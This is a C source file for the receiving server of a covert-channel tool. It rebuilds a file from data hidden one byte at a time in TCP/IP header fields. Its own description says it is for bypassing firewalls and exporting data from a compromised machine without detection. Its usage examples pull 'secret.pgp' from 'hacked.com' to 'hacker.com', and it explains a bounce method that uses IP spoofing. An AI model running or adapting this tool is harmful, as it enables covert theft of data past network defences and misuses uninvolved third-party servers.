/*
 ==============================================================================================
 Name        	:	Covert_Transfer.c

 Author      	: 	Jivanjot S. Brar

 Version     	:	1.0

 Copyright   	: 	GPL

 Description 	: 	This program manipulates the TCP/IP header to transfer a file one byte
 :	at a time to a destination host. This is useful for bypassing fire walls
 :	from the inside, and for exporting data with innocuous looking packets
 :	that contain no data for sniffers to analyze.
 :
 :	This is a Server application that resides on a friendly machine and
 :	receives data from the client application residing on a compromised
 :	machine.
 :

 Compile	 	:	gcc -Wall -o svr_covert Covert_Server.c

 Execute		:	./svr_covert -source [ip] -listen_port [port default 80]
 :	-ofile [outfilename] -encodetype
 ==============================================================================================
 */

#include "common.h"

int main(int argc, char *argv[]) {

	client *cln;

	// can they run it as a root.
	if (geteuid() != 0) {
		printf(
				"\nYou need to be root to run this.\n\nApplication Terminated!\n\n");
		exit(0);
	}

	if (argc < 6 || argc > 9) {
		print_usage(argv);
		exit(EXIT_FAILURE);
	}

	cln = client_new();
	validate_args(argc, argv, cln);

	printf("\n\nListening packets from: \n");
	printf("============================\n\n");
	printf("Source		:	%s\n", cln->srchost);
	printf("Listening Port	:	%u\n", cln->dest_port);
	printf("Filename	:	%s\n", cln->filename);
	if (cln->bounce)
		printf("Transfer mode :	Bounce\n");
	if (cln->urg_ptr)	// if Urgent Pointer is SET
		printf("Encoding Type 	: 	TCP Urgent Pointer\n\n");
	else if (cln->tos)
		printf("Encoding Type 	: 	IP Type of Service\n\n");
	else if (cln->frag_off)
		printf("Encoding Type 	: 	IP Fragment Offset\n\n");
	else if (cln->ack)		// if Acknowledgement field is SET
		printf("Encoding Type 	: 	TCP Acknowledgement\n\n");
	else if (cln->seq)
		printf("Encoding Type 	: 	TCP Sequence\n\n");
	else if (cln->id)
		printf("Encoding Type 	: 	IP Identification\n\n");

	recv_packets(cln);

	return EXIT_SUCCESS;
}

void recv_packets(client *c) {
	int recv_socket;
	FILE *output;

	if ((output = fopen(c->filename, "wb")) == NULL) {
		printf("recv_packets() fopen: unable to open the file %s.\n",
				c->filename);
		exit(EXIT_FAILURE);
	}

	// reading loop.
	for (;;) {

		// Open socket for reading
		recv_socket = socket(AF_INET, SOCK_RAW, 6);
		if (recv_socket < 0) {
			perror("recv_packets() socket: unable to open the socket.\n");
			exit(EXIT_FAILURE);
		}

		// Listen for return packet on a passive socket
		read(recv_socket, (struct recv_tcp *) &recv_pkt, 9999);
		if (c->bounce) {
			if ((recv_pkt.tcp.ack == 1)
					&& (recv_pkt.ip.daddr == host_convert(c->srchost)
							&& (recv_pkt.tcp.source == htons(c->dest_port)))) {
				if (c->ack) {
					printf("Receiving Data: %c\n", recv_pkt.tcp.ack_seq);
					fprintf(output, "%c", recv_pkt.tcp.ack_seq);
					fflush(output);
				} else {
					printf(
							"INVALID DECODING OPTION SELECTED FOR -bounce. \nValid option is -ack\n");
					exit(EXIT_FAILURE);
				}
			}
		} else if ((recv_pkt.tcp.syn == 1)
				&& (recv_pkt.ip.saddr == host_convert(c->srchost))
				&& (recv_pkt.tcp.dest == htons(c->dest_port))) {
			if (c->urg_ptr) {
				printf("Receiving Data: %c\n", recv_pkt.tcp.urg_ptr);
				fprintf(output, "%c", recv_pkt.tcp.urg_ptr);
				fflush(output);
			} else if (c->tos) {
				printf("Receiving Data: %c\n", recv_pkt.ip.tos);
				fprintf(output, "%c", recv_pkt.ip.tos);
				fflush(output);
			} else if (c->id) {
				printf("Receiving Data: %c\n", recv_pkt.ip.id);
				fprintf(output, "%c", recv_pkt.ip.id);
				fflush(output);
			} else if (c->seq) {
				printf("Receiving Data: %c\n", recv_pkt.tcp.seq);
				fprintf(output, "%c", recv_pkt.tcp.seq);
				fflush(output);
			} else if (c->ack) {
				printf("Receiving Data: %c\n", recv_pkt.tcp.ack_seq);
				fprintf(output, "%c", recv_pkt.tcp.ack_seq);
				fflush(output);
			} else if (c->frag_off) {
				printf("Receiving Data: %c\n", recv_pkt.ip.frag_off);
				fprintf(output, "%c", recv_pkt.ip.frag_off);
				fflush(output);
			}
		}
		close(recv_socket);
	}
	fclose(output);
}

bool if_exists(char *array[], char *value) {
	int count = 0;
	for (count = 0; count < 10; ++count) {
		if (strcmp(array[count], value) == 0) {
			return true;
		}
	}
	return false;
}

void SystemFatal(char *msg) {
	printf("\n%s\n\n", msg);
	exit(EXIT_FAILURE);
}

void validate_args(int argc, char *argv[], client *c) {
	int count = 0;

	for (count = 1; count < argc; ++count) {
		if (!if_exists(options, argv[count])) {
			printf("\n**Invalid Option: %s\n", argv[count]);
			printf("\nPress ENTER for examples.\n\n");
			getchar();
			print_usage(argv);
			exit(EXIT_FAILURE);
		}

		if (strcmp(argv[count], "-listen_port") == 0) {
			if (if_exists(options, argv[count + 1]) == false) {
				c->dest_port = atoi(argv[count + 1]);
				c->destport = 1;
				count += 1;
			} else {
				SystemFatal("INVALID [value] FOR OPTION -listen_port");
			}
		} else if (strcmp(argv[count], "-source") == 0) {
			if (if_exists(options, argv[count + 1]) == false) {
				strcpy(c->srchost, argv[count + 1]);
				c->source_host = host_convert(argv[count + 1]);
				c->source = 1;
				count += 1;
			} else {
				SystemFatal("INVALID [value] FOR OPTION -source");
			}
		} else if (strcmp(argv[count], "-ofile") == 0) {
			if (if_exists(options, argv[count + 1]) == false) {
				strcpy(c->filename, argv[count + 1]);
				c->file = 1;
				count += 1;
			} else {
				SystemFatal("INVALID [value] FOR OPTION -ofile");
			}
		} else if (strcmp(argv[count], "-urg_ptr") == 0) {
			c->urg_ptr = 1;
		} else if (strcmp(argv[count], "-tos") == 0) {
			c->tos = 1;
			c->urg_ptr = 0;
		} else if (strcmp(argv[count], "-frag_off") == 0) {
			c->frag_off = 1;
			c->urg_ptr = 0;
		} else if (strcmp(argv[count], "-seq") == 0) {
			c->seq = 1;
			c->urg_ptr = 0;
		} else if (strcmp(argv[count], "-ack") == 0) {
			c->ack = 1;
			c->urg_ptr = 0;
		} else if (strcmp(argv[count], "-id") == 0) {
			c->id = 1;
			c->urg_ptr = 0;
		} else if (strcmp(argv[count], "-bounce") == 0) {
			c->bounce = 1;
		}
	}
}

client *client_new(void) {
	client *c = malloc(sizeof(client));
	c->source_host = 0;
	c->dest_port = 80;
	c->bounce = 0;
	c->urg_ptr = 1; 	// TCP HEADER [DEFAULT]
	c->seq = 0;			// TCP HEADER
	c->ack = 0;			// TCP HEADER
	c->id = 0;			// IP HEADER
	c->tos = 0;			// IP HEADER
	c->file = 0;
	c->destport = 0;
	c->source = 0;
	return c;
}

void print_usage(char *argv[]) {
	printf(
			"Covert Transfer Usage: \n%s -source [source_ip] -dest_port port -ofile filename -[encode type]\n\n",
			argv[0]);
	printf(
			"-listen_port [port]	- IP port you want data to go to. [DEFAULT PORT == 80]\n");
	printf(
			"-source [source_ip]	- Host where you want to data to originate from.\n"
					"			  (Source can include a bounce server address).\n");
	printf(
			"-bounce				- This is used to inform the Server that bounce technique is used to trasmit packets.\n");
	printf(
			"-ofile [filename]	- Name of the file to save the decoded data.\n\n");
	printf("[Encode Type]: Following are the optional encoding types: \n");
	printf(
			"	-urg_ptr	- Decode data a byte at a time from the TCP packet Urgent Pointed field.\n");
	printf(
			"	-seq		- Decode data a byte at a time from the TCP packet sequence number field. \n");
	printf(
			"	-ack		- Decode data a byte at a time from the TCP packet acknowledge field. \n");
	printf(
			"	-id		- Decode data a byte at a time from the IP packet identification field. \n");
	printf(
			"	-tos	- Decode data a byte at a time from the IP packet's Type of Service field.\n\n");

	printf(
			"Examples\n=====================================================================================================================\n\n");
	printf(
			"Example 1: \n %s -source hacked.com -listen_port 80 -ofile secret.pgp -frag_off \n"
					" %s -dest hacker.com -listen_port 80 -ofile secret.pgp -urg_ptr \n\n",
			argv[0], argv[0]);

	printf(
			"Example 2: \n %s -source [itself, its own IP] -listen_port 80 -bounce -ofile filename -ack\n",
			argv[0]);
	printf(
			"In Example 2, the source IP provided is the IP of the server itseft. In the bounce method \n"
					"the client send the packet to a random live server spoofing the ip of the server and using sequence\n"
					"field to encode the data. The server then recives an SYN/ACK or RST/ACK in which the data is now\n"
					"encoded into the acknowledgment field (SEQUENCE FIELD + 1)");

	printf(
			" The example above receives the secret.pgp file a byte at time from hacked.com on port 80 either using\n"
					" IP headers identification field, type of service field or TCP headers urgent pointer field, sequence\n"
					" field or acknowledgement field.\n\n");

}

unsigned int host_convert(char *hostname) {
	static struct in_addr i;
	struct hostent *h;
	i.s_addr = inet_addr(hostname);
	if (i.s_addr == -1) {
		h = gethostbyname(hostname);
		if (h == NULL) {
			fprintf(stderr, "cannot resolve %s\n", hostname);
			exit(0);
		}
		bcopy(h->h_addr, (char *) &i.s_addr, h->h_length);
	}
	return i.s_addr;
}
